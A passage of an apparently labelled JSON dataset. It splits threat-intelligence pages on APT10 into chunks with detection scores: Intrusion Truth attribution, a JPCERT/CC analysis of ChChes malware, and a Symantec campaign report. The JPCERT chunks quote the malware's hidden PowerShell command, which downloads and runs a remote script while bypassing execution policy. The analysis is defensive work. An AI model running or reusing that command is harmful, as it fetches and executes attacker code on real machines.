        "text": "Either:\nsomeone with the\u00a0same name as an apparent APT10 hacker,\ntravelled from the\u00a0same building as an APT10 associated company, and\nmet frequently\u00a0with the Ministry of State Security in Tianjin.\n Or:\nAPT10 was the work of the Chinese Ministry of State Security.\u00a0\n Share this:TwitterFacebookLike Loading...\n\nWho is Mr\u00a0Gao?August 2, 2018In \"APT10\"Who is Mr\u00a0Zhang?August 6, 2018In \"APT10\"More on Huaying Haitai and Laoying Baichaun, the companies associated with APT10. Is there a state\u00a0connection?August 9, 2018In \"APT10\" \n\nTagged#menupass#msp#tianjinAPT10cloudhopperintrusiontruth\n\n\n\nPost navigation\nMore on Huaying Haitai and Laoying Baichaun, the companies associated with APT10. Is there a state\u00a0connection?Who is Mr An, and was he working for\u00a0APT10?\n\n\n\n\t\t\t40 thoughts on \u201cAPT10 was managed by the Tianjin bureau of the Chinese Ministry of State\u00a0Security\u201d\t\t\n\n\n\n\t\t\t\tPingback:",
        "source": "APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security \u2013 Intrusion Truth.html",
        "detection": {
            "response": false,
            "confidence": 0.28057464957237244
        },
        "prediction": {}
    },
    {
        "text": "IT Security Weekend Catch Up \u2013 August 18, 2018 \u2013 BadCyber \n\n\n\n\t\t\t\tPingback: APT10 Under Close Scrutiny as Potentially Linked to Chinese Ministry of State Security | The first stop for security news | Threatpost \n\n\n\n\t\t\t\tPingback: Peringatan AS Tentang Gaya Peretasan Baru dari Kelompok Cloudhopper yang Terkait dengan Tiongkok - EpochTimesId \n\n\n\n\t\t\t\tPingback: Australian Media Reveals Companies Under Chinese Spy Agency Attack \u2013 The Epoch Times (Singapore) \n\n\n\n\t\t\t\t Pingback: Weekendowa Lektura: odcinek 276",
        "source": "APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security \u2013 Intrusion Truth.html",
        "detection": {
            "response": false,
            "confidence": 0.47203102707862854
        },
        "prediction": {}
    },
    {
        "text": "Bierzcie i czytajcie | Zaufana Trzecia Strona \n\n\n\n\t\t\t\tPingback: US charges two Chinese nationals for hacking cloud providers, NASA, the US Navy \u2013 Deasil News \n\n\n\n\t\t\t\tPingback: US charges two Chinese nationals for hacking cloud providers, NASA, the US Navy - Cybersecurity News Blog \n\n\n\n\t\t\t\tPingback: US charges two Chinese nationals for hacking cloud providers, NASA, the US Navy \u2013 RootDaemon.com \n\n\n\n\t\t\t\tPingback: US fees two Chinese nationals for hacking cloud suppliers, NASA, the US Navy - Field Services on Demand \n\n\n\n\t\t\t\tPingback: US expenses two Chinese nationals for hacking cloud companies, NASA, the US Navy - Global Service Tech \n\n\n\n\t\t\t\tPingback: US charges two Chinese nationals for hacking cloud providers, NASA, the US Navy \u2013 Tech&Sport \n\n\n\n\t\t\t\tPingback: US charges two Chinese nationals for hacking cloud providers, NASA, the US Navy-Germany Times of News \n\n\n\n\t\t\t\tPingback: \u041c\u0438\u043d\u044e\u0441\u0442 \u0421\u0428\u0410 \u043e\u0431\u0432\u0438\u043d\u0438\u043b \u0434\u0432\u0443\u0445 \u0433\u0440\u0430\u0436\u0434\u0430\u043d \u041a\u0438\u0442\u0430\u044f \u0432 \u0441\u0432\u044f\u0437\u0438 \u0441 APT10 | Coin-Insider.ru \n\n\n\n\t\t\t\tPingback: \u041c\u0438\u043d\u044e\u0441\u0442 \u0421\u0428\u0410 \u043e\u0431\u0432\u0438\u043d\u0438\u043b \u0434\u0432\u0443\u0445 \u0433\u0440\u0430\u0436\u0434\u0430\u043d \u041a\u0438\u0442\u0430\u044f \u0432 \u0441\u0432\u044f\u0437\u0438 \u0441 APT10 | DevsAid.",
        "source": "APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security \u2013 Intrusion Truth.html",
        "detection": {
            "response": false,
            "confidence": 0.07476021349430084
        },
        "prediction": {}
    },
    {
        "text": "Com - Internet Community \n\n\n\n\t\t\t\tPingback: \u041c\u0438\u043d\u044e\u0441\u0442 \u0421\u0428\u0410 \u043e\u0431\u0432\u0438\u043d\u0438\u043b \u0434\u0432\u0443\u0445 \u0433\u0440\u0430\u0436\u0434\u0430\u043d \u041a\u0438\u0442\u0430\u044f \u0432 \u0441\u0432\u044f\u0437\u0438 \u0441 APT10 | UA PROTECTION \n\n\n\n\t\t\t\tPingback: US charges two Chinese nationals for hacking cloud providers, NASA, the US Navy - ZDNet - Internet of This \n\n\n\n\t\t\t\tPingback: APT10 Targeted Norwegian MSP and US Companies in Sustained Campaign - f1tym1 \n\n\n\n\t\t\t\tPingback: APT-doxing group exposes APT17 as Jinan bureau of China\u2019s Security Ministry \u2013 Breaching News \u2013 Better safe than sorry \n\n\n\n\t\t\t\tPingback: \u0425\u0430\u043a\u0435\u0440\u044b \u043f\u0440\u043e\u0442\u0438\u0432 \u0445\u0430\u043a\u0435\u0440\u043e\u0432. \u0413\u0440\u0443\u043f\u043f\u0438\u0440\u043e\u0432\u043a\u0430 Intrusion Truth \u0434\u0435\u0430\u043d\u043e\u043d\u0438\u043c\u0438\u0437\u0438\u0440\u043e\u0432\u0430\u043b\u0430 \u0443\u0447\u0430\u0441\u0442\u043d\u0438\u043a\u043e\u0432 \u043a\u0438\u0442\u0430\u0439\u0441\u043a\u043e\u0439 APT17 | UA PROTECTION \n\n\n\n\t\t\t\tPingback: Intrusion Truth r\u00e9v\u00e8le l\u2019identit\u00e9 du groupe APT17 et ses liens avec le gouvernement chinois | SSI PLG \n\n\n\n\t\t\t\tPingback: Intrusion Truth r\u00e9v\u00e8le l\u2019identit\u00e9 du groupe APT17 et ses liens avec le gouvernement chinois | Blog a T\u00e9odulle \n\n\n\n\t\t\t\tPingback: FBI is investigating more than 1,000 cases of Chinese theft of US technology \n\n\n\n\t\t\t\tPingback: Le FBI enqu\u00eate sur plus de 1 000 cas de vols de technologie am\u00e9ricaine par la Chine | Blog a T\u00e9odulle \n\n\n\n\t\t\t\tPingback:",
        "source": "APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security \u2013 Intrusion Truth.html",
        "detection": {
            "response": false,
            "confidence": 0.14074306190013885
        },
        "prediction": {}
    },
    {
        "text": "This Week in Security News: The First Patch Tuesday Update of 2020 and Pwn2Own Vancouver Announced - \n\n\n\n\t\t\t\tPingback: 5 Questions About China That Boards Should Be Asking Right Now - OUTBREAK WIRE \n\n\n\n\t\t\t\tPingback: 5 Questions About China That Boards Should Be Asking",
        "source": "APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security \u2013 Intrusion Truth.html",
        "detection": {
            "response": true,
            "confidence": 0.5116057991981506
        },
        "prediction": {}
    },
    {
        "text": "Now - Harvard Business Review - Jesus Loves Pakistan \n\n\n\n\t\t\t\tPingback: 5 Questions About China That Boards Should Be Asking Right Now * EPeak World News \n\n\n\n\t\t\t\tPingback: 5 Questions About China That Boards Should Be Asking Right Now - Supply Chain Council of European Union | Scceu.org \n\n\n\n\t\t\t\tPingback: 5 Questions About China That Boards Should Be Asking Right Now | General News \n\n\n\n\t\t\t\tPingback: 5 Questions About China That Boards Should Be Asking Right Now - Coronavirus Wire \n\n\n\n\t\t\t\tPingback: 5 Questions About China That Boards Should Be Asking Right Now - VIRUS NEWSWIRE \n\n\n\n\t\t\t\tPingback: 5 Questions About China That Boards Should Be Asking Right Now \n\n\n\n\t\t\t\tPingback: 5 Questions About China That Boards Should Be Asking Right Now | SPRATLY ISLANDS \n\n\n\n\t\t\t\tPingback: 5 Questions About China That Boards Should Be Asking",
        "source": "APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security \u2013 Intrusion Truth.html",
        "detection": {
            "response": false,
            "confidence": 0.27701330184936523
        },
        "prediction": {}
    },
    {
        "text": "Now - VIRAL WIRE \n\n\n\n\t\t\t\tPingback: 5 Questions About China That Boards Should Be Asking Right Now \u2013 NewsHub \n\n\n\n\t\t\t\tPingback: 5 Questions About China That Boards Should Be Asking",
        "source": "APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security \u2013 Intrusion Truth.html",
        "detection": {
            "response": true,
            "confidence": 0.6037254929542542
        },
        "prediction": {}
    },
    {
        "text": "Now - Lanka Buzz \n\n\n\n\t\t\t\tPingback: 5 Questions About China That Boards Should Be Asking Right Now \n\n\n\n\t\t\t\tPingback: Connection discovered between Chinese hacker group APT15 and defense contractor | ZDNet - CyberGen \n\n\n\n\t\t\t\tPingback: Instrumental Connection discovered between Chinese hacker group APT15 and defense contractor Music - Instrumental Music \n\n\n\n\t\t\t\tPingback: 5 Supply Chain Cyber Attacks that Illustrate Why CMMC Is Needed - CyberSheath \n\n\nComments are closed.\n\n\n\n\n\n\n Create a free website or blog at WordPress.com.\n\n\n\n\nMenu\nMenu\n\nHome\nContact\n \n\nTwitter\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFollow\n\n\n\nFollowing\n\n\n\n\n\n\n\n\t\t\t\tIntrusion Truth\t\t\t\n\n\n\nJoin 102 other followers\n\n\n\n\n\n\n\n \n\n\t\t\t\t\t\t\t\t\t\t\t\tSign me up\t\t\t\t\t\t\t\t\t\t\t\n\n\n\n\n\t\t\t\t\t\t\t\t\t\t\tAlready have a WordPress.com account?",
        "source": "APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security \u2013 Intrusion Truth.html",
        "detection": {
            "response": false,
            "confidence": 0.23218700289726257
        },
        "prediction": {}
    },
    {
        "text": "Privacy\t\t\t\t\t\t\n\n\n\n \n\n\n\n\n\n\t\t\t\tIntrusion Truth\t\t\t\n\n\n\n Customize\n\n\n\n\n\nFollow\n\n\n\nFollowing\n\n\nSign up\nLog in\nCopy shortlink\n\n\n\t\t\t\t\t\t\t\t\t\t\tReport this content\t\t\t\t\t\t\t\t\t\t\n\n\n\n\t\t\t\t\t\t\t\t\t\t\tView post in Reader\t\t\t\t\t\t\t\t\t\t\n\n\nManage subscriptions\n\nCollapse this bar\n\n\n\n\n\n\n\n\n\n\u00a0\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nLoading Comments...\n\n\n\n\u00a0\n\n\nWrite a Comment...\n\n\n\n\n Email (Required)\n\n\n\nName (Required)\n\n\n\nWebsite\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n \n\n\n%d \n\n\n \n\n\n",
        "source": "APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security \u2013 Intrusion Truth.html",
        "detection": {
            "response": false,
            "confidence": 0.46774861216545105
        },
        "prediction": {}
    },
    {
        "text": "\n\n  \nMalware Leveraging PowerSploit - JPCERT/CC Eyes | JPCERT Coordination Center official Blog\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n      \n\n\n\n\n\n\n \n\n\n\n\n\n\n\n\n\nJPCERT/CC Eyes\n\nJPCERT Coordination Center official Blog\n\nLanguage:\n\n\n\u65e5\u672c\u8a9e\nEnglish\n\n\n\n\n\n\n\nTop\u00a0>\u00a0List of \u201cMalware\u201d\u00a0>\u00a0Malware Leveraging PowerSploit\n      \n\n\n\n\n\n\n\n\n\n\n\n\n\u671d\u9577 \u79c0\u8aa0 (Shusei Tomonaga)\n\n\nMarch  1, 2017\n\n\nMalware Leveraging PowerSploit\n\n\n\nChChes\n\n\n\n\n\n\n\n\n\nEmail\n\n\n\n\nHi again, this is Shusei Tomonaga from the Analysis Center.\n",
        "source": "Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.4502294063568115
        },
        "prediction": {}
    },
    {
        "text": "In this article, I\u2019d like to share some of our findings about ChChes (which we introduced in a previous article) that it leverages PowerSploit",
        "source": "Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.6552923917770386
        },
        "prediction": {}
    },
    {
        "text": "Flow of ChChes Infection\nThe samples that JPCERT/CC confirmed this time infect machines by leveraging shortcut files. The flow of events from a victim opening the shortcut file until a machine is infected is illustrated in Figure 1.\n Figure 1: Flow of events from opening a shortcut file to ChChes infection\n\n\n\n\n\n\nWhen the shortcut file is opened, a file containing PowerShell script is downloaded from an external server and then executed. Next, ChChes code (version 1.6.4) contained in the PowerShell script is injected into powershell.exe and executed.",
        "source": "Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.3781628906726837
        },
        "prediction": {}
    },
    {
        "text": "The detailed behaviour in each phase is described below.\n Behaviour after the shortcut file is opened\nWhen the shortcut file is opened, the following PowerShell script contained in the file is executed.\n",
        "source": "Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.7529773116111755
        },
        "prediction": {}
    },
    {
        "text": "-w hidden -exec bypass  -enc JAAyAD0AJwAtAG4Abw ~omitted~\n\nThe PowerShell script after \u201c-enc\u201d is encoded. Below is the decoded script:\n$2='-nop -w hidden -exec bypass -c \"IEX (New-Object System.",
        "source": "Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.48580583930015564
        },
        "prediction": {}
    },
    {
        "text": "Webclient).DownloadString(''https://goo.gl/cpT1NW'')\"';if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";iex \"& $3 $2\";}else{iex \"& powershell $2\";}\nBy executing the above PowerShell script, a file containing PowerShell script is downloaded from a specified URL. The downloaded script is loaded in 32-bit powershell.exe (syswow64\\WindowsPowerShell\\v1.0\\powershell) and executed. The reason why it is executed in 32-bit is considered to be that ChChes\u2019s assembly code contained in the PowerShell script is not compatible with 64-bit environment.\n\u00a0\n Details of the Downloaded PowerShell Script\nThe downloaded PowerShell script is partially copied from PowerSploit (Invoke-Shellcode.ps1).",
        "source": "Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.32127705216407776
        },
        "prediction": {}
    },
    {
        "text": "PowerSploit is a tool to execute files and commands on a remote host and is used for penetration tests.\n When the downloaded PowerShell script is executed, it creates document files based on data contained in the script, store the files in the %TEMP% folder and displays them. \u00a0 We\u2019ve seen different types of documents shown, including Excel and World documents.\n\u00a0\n",
        "source": "Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.5899832844734192
        },
        "prediction": {}
    },
    {
        "text": "Next, ChChes code contained in the PowerShell is injected into powershell.exe. The injected ChChes receives commands and modules from C2 servers as explained in the previous blog post. The PowerShell script and the injected ChChes are not saved as files in the infected machines, and ChChes itself only exists in the memory.\n Figure 2 is a part of the PowerShell script.\n Figure 2: Downloaded PowerShell script\n\n\n\n\n\n\nConfirming Attack Traces through Event Logs\nIn environments where PowerShell v5.0 is installed (including Windows 10), the PowerShell script downloaded from remote servers are recorded in the event logs under the default settings (as Figure 3).",
        "source": "Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.48588237166404724
        },
        "prediction": {}
    },
    {
        "text": "Figure 3: Contents recorded in Event Logs\n\n\n\n\n\n\nSuch logs can also be obtained in PowerShell v4.0 (Default version of Windows 8.1) by enabling the following Group Policy.\n\n Computer Configuration -> Administrative Templates -> Windows Components -> Windows PowerShell -> Turn on PowerShell Script Block Logging\n\nSummary\nIt is now quite common that PowerShell script is leveraged for attacks.",
        "source": "Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.40203627943992615
        },
        "prediction": {}
    },
    {
        "text": "If your event log configuration is not set to record PowerShell execution, it is recommended that you revise the settings in preparation for such attacks. Also, if you are not using PowerShell, it is suggested to restrict the execution by using AppLocker, etc.\n",
        "source": "Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.5253899693489075
        },
        "prediction": {}
    },
    {
        "text": "-Shusei Tomonaga\n(Translated by Yukako Uchida)\n\nReferences:\n\n [1] PowerSploit\nhttps://github.com/PowerShellMafia/PowerSploit\n\nAppendix A: SHA-256 Hash Values of the samples\n\nPowerShell\n\n\n4ff6a97d06e2e843755be8697f3324be36e1ebeb280bb45724962ce4b6710297\n75ef6ea0265d2629c920a6a1c0d1dd91d3c0eda86445c7d67ebb9b30e35a2a9f\nae0dd5df608f581bbc075a88c48eedeb7ac566ff750e0a1baa7718379941db86\n646f837a9a5efbbdde474411bb48977bff37abfefaa4d04f9fb2a05a23c6d543\n3d5e3648653d74e2274bb531d1724a03c2c9941fdf14b8881143f0e34fe50f03\n9fbd69da93fbe0e8f57df3161db0b932d01b6593da86222fabef2be31899156d\n723983883fc336cb575875e4e3ff0f19bcf05a2250a44fb7c2395e564ad35d48\nf45b183ef9404166173185b75f2f49f26b2e44b8b81c7caf6b1fc430f373b50b\n471b7edbd3b344d3e9f18fe61535de6077ea9fd8aa694221529a2ff86b06e856\naef976b95a8d0f0fdcfe1db73d5e0ace2c748627c1da645be711d15797c5df38\ndbefa21d3391683d7cc29487e9cd065be188da228180ab501c34f0e3ec2d7dfc\n\n\n\n\n\n\n\n\nEmail\n\n\n\n\n\nAuthor\n\n\n\n\n\n\n\u671d\u9577 \u79c0\u8aa0 (Shusei Tomonaga)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
        "source": "Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.23121552169322968
        },
        "prediction": {}
    },
    {
        "text": "Since December 2012, he has been engaged in malware analysis and forensics investigation, and is especially involved in analyzing incidents of targeted attacks. Prior to joining JPCERT/CC, he was engaged in security monitoring and analysis operations at a foreign-affiliated IT vendor.",
        "source": "Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.4721909761428833
        },
        "prediction": {}
    },
    {
        "text": "If you wish to make comments or ask questions, please use this form.\n\n This form is for comments and inquiries.",
        "source": "Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.5061925649642944
        },
        "prediction": {}
    },
    {
        "text": "Related articles\n\n\n\n\n\n\n\nMalDoc in PDF - Detection bypass by embedding a malicious Word file into a PDF file \u2013\n\n\n\n\n\n\n\n\n\nYAMA-Yet Another Memory Analyzer for malware detection\n\n\n\n\n\n\n\n\n\n DangerousPassword attacks targeting developers\u2019 Windows, macOS, and Linux environments\n\n\n\n\n\n\n\n\n\nHow to Create F.L.I.R.T Signature Using Yara Rules for Static Analysis of ELF Malware\n\n\n\n\n\n\n\n\n\nGobRAT malware written in Go language targeting Linux routers\n\n\n\n\n\n\n\n\nBack\n\n\nTop\n\n\nNext\n\n\n\n\n\n\n\n\n\u00d7\u691c\u7d22\u00a0\u30ab\u30b9\u30bf\u30e0\u691c\u7d22 \u8868\u793a\u9806:RelevanceRelevanceDate\n\n\n\nCategories\n\n\nMalware\n\n\nIncident\n\n\nEvent\n\n\nVulnerability\n\n\nSecurity Technology\n\n\nForensic\n\n\nCyber Metrics\n\n\nICS-OT\n\n\nOther\n\n\n\n\n\n\nTags\n\n\nPython\n\n\nConference\n\n\nDatper\n\n\nChChes\n\n\nTraining\n\n\nStatistics and Indicator\n\n\nTool\n\n\nBlackTech\n\n\nLogonTracer\n\n\nReport\n\n\nSplunk\n\n\nElasticStack\n\n\nimpfuzzy\n\n\nvolatility\n\n\nRedLeaves\n\n\nPlugX\n\n\nDarkHotel\n\n\nBanking malware\n\n\nPacific_Islands\n\n\nCSIRT\n\n\nPassword\n\n\nPolicy\n\n\nDDoS\n\n\nAPT\n\n\nTrend\n\n\nAfrica\n\n\nSecureCoding\n\n\nSysmonSearch\n\n\nJSAC\n\n\nIoT\n\n\nIIoT\n\n\nQuasar\n\n\nLODEINFO\n\n\nLazarus\n\n\nEmotet\n\n\nPhishing\n\n\nMetrics\n\n\nTSUBAME\n\n\nStandard-Guideline\n\n\n\n\n      \n            \n      \n\n\n        \n  \n  \u3000\n\nRanking\n\n\n\n\n1\n\n\n\n\n\n\n\nMalDoc in PDF - Detection bypass by embedding a malicious Word file into a PDF file \u2013 \n\n\n\n\n\n\n2\n\n\n\n\n\n\n\nTSUBAME Report Overflow (Jul-Sep 2023) \n\n\n\n\n\n\n3\n\n\n\n\n\n\n\nHow to Use Volatility 3 Offline \n\n\n\n\n\n\n4\n\n\n\n\n\n\n\nWindows Commands Abused by Attackers \n\n\n\n\n\n\n5\n\n\n\n\n\n\n\nAnti-UPX Unpacking Technique \n\n\n\n\n\n\n\n\n\n\nAuthors\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nArchives\n\n202318\n202219\n202120\n202021\n201918\n201812\n201717\n201618\n201520\n201418\n20137\n20122\n20118\n20104\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nJPCERT/CC\n\n8F Tozan Bldg, 4-4-2 Nihonbashi-Honcho, Chuo-ku, Tokyo 1030023 JAPAN\nTEL: +81-3-6271-8901\u3000FAX: +81-3-6271-8908\n\n\n\n\n\nPrivacy Policy\nDisclaimer\n\n\n\n\u00a9 1996-2023 JPCERT/CC\n\n\n\n\n\n",
        "source": "Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.15266108512878418
        },
        "prediction": {}
    },
    {
        "text": "\n\n\n\n\n\n\n\n\n\n\nJapan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign | Symantec Enterprise Blogs\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSymantec Enterprise BlogsThreat IntelligenceMenuMain menuBlogs HomeThreat Intelligence - All DivisionsFeature Stories - Symantec EnterpriseExpert Perspectives - Symantec EnterpriseSymantec and AIProduct InsightsRansomwareSolarWindsRSA Conference\u65e5\u672c\u8a9eSearchBroadcom HomeThreat Hunter TeamSymantecTwitterLinkedInSHAREPosted: 17 Nov, 20208 Min ReadThreat Intelligence Translation: \u65e5\u672c\u8a9e SubscribeFollowtwitterlinkedinJapan-Linked Organizations Targeted in Long-Running and Sophisticated Attack CampaignEvidence that advanced persistent threat group Cicada is behind attack campaign targeting companies in 17 regions and multiple sectors.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": false,
            "confidence": 0.2041913866996765
        },
        "prediction": {}
    },
    {
        "text": "A large-scale attack campaign is targeting multiple Japanese companies, including subsidiaries located in as many as 17 regions around the globe in a likely intelligence-gathering operation.\n ",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.6354032754898071
        },
        "prediction": {}
    },
    {
        "text": "Companies in multiple sectors are targeted in this campaign, including those operating in the automotive, pharmaceutical, and engineering sector, as well as managed service providers (MSPs).\n  The scale and sophistication of this attack campaign indicates that it is the work of a large and well-resourced group, with Symantec, a division of Broadcom (NASDAQ: AVGO), discovering enough evidence to attribute it to Cicada (aka APT10, Stone Panda, Cloud Hopper). Cicada has been involved in espionage-type operations since 2009, and U.S. government officials have linked the activities of APT10, which we track as Cicada, to the Chinese government.\n ",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": false,
            "confidence": 0.3439609706401825
        },
        "prediction": {}
    },
    {
        "text": "Cicada has historically been known to target Japan-linked organizations, and has also targeted MSPs in the past.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.594849705696106
        },
        "prediction": {}
    },
    {
        "text": "The group is using living-off-the-land tools as well as custom malware in this attack campaign, including a custom malware - Backdoor.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.6653828620910645
        },
        "prediction": {}
    },
    {
        "text": "Among the machines compromised during this attack campaign were domain controllers and file servers, and there was evidence of files being exfiltrated from some of the compromised machines.\n The attackers extensively use DLL side-loading in this campaign, and were also seen leveraging the ZeroLogon vulnerability that was patched in August 2020.\n",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.5913968682289124
        },
        "prediction": {}
    },
    {
        "text": "This campaign was first discovered by Symantec when suspicious DLL side-loading activity on one of our customer\u2019s networks triggered an alert in our Cloud Analytics\u00a0technology, which is available in Symantec Endpoint Security Complete (SESC). This activity was then reviewed by our Threat Hunter analysts before being passed on to our investigations team for further analysis.\n Cloud Analytics leverages artificial intelligence in order to comb through Symantec\u2019s vast data and spot patterns associated with targeted attacks.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": false,
            "confidence": 0.39271003007888794
        },
        "prediction": {}
    },
    {
        "text": "It is capable of automatically flagging incidents that would otherwise have taken thousands of hours of analyst time to identify.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.5175457000732422
        },
        "prediction": {}
    },
    {
        "text": "The initial Cloud Analytics alert allowed our threat hunting team to identify further victims of this activity, build a more complete picture of this campaign, and attribute this activity to Cicada. It also allowed us to update and create new protections to ensure our customers are protected from this activity.\n",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.5866708755493164
        },
        "prediction": {}
    },
    {
        "text": "Victims\nThis campaign has been ongoing since at least mid-October 2019, right up to the beginning of October 2020, with the attack group active on the networks of some of its victims for close to a year. The campaign is very wide-ranging, with victims in a large number of regions worldwide.\n",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.5761306881904602
        },
        "prediction": {}
    },
    {
        "text": "Locations of some of the companies targeted in this campaign; most of those targeted have links to Japan or Japanese organizationsThe companies hit are, in the main, large, well-known organizations, many of which have links to Japan or Japanese companies, which is one of the main factors tying the victims together.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.5771855115890503
        },
        "prediction": {}
    },
    {
        "text": "Cicada has been known to have a strong focus on Japanese organizations in previous attack campaigns.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.6304622888565063
        },
        "prediction": {}
    },
    {
        "text": "As is clear from the map in Figure 1, South and East Asia are strong areas of focus for the attackers in this campaign. It is unusual to see a reportedly Chinese-government-linked group attacking companies within China\u2019s borders but, like many of the companies targeted in this campaign, the target in that instance is a subsidiary of a Japanese organization.\n We also saw similar loaders on all the victim networks.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": false,
            "confidence": 0.49040040373802185
        },
        "prediction": {}
    },
    {
        "text": "These are among the main factors linking these victims together, with all of them coming from a wide variety of sectors, including:\n\nAutomotive, with some manufacturers and organizations involved in supplying parts to the motor industry also targeted, indicating that this is a sector of strong interest to the attackers\nClothing\nConglomerates\nElectronics\nEngineering\nGeneral Trading Company\nGovernment\nIndustrial Products\nManaged Service Providers\nManufacturing\nPharmaceutical\nProfessional Services\n\nThe amount of time the attackers spent on the networks of victims varied, with the attackers spending a significant amount of time on the networks of some victims, while spending just days on other victim networks.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": false,
            "confidence": 0.43304771184921265
        },
        "prediction": {}
    },
    {
        "text": "In some cases, too, the attackers spent some time on a network but then the activity would cease, but start again some months later.\n",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.6321807503700256
        },
        "prediction": {}
    },
    {
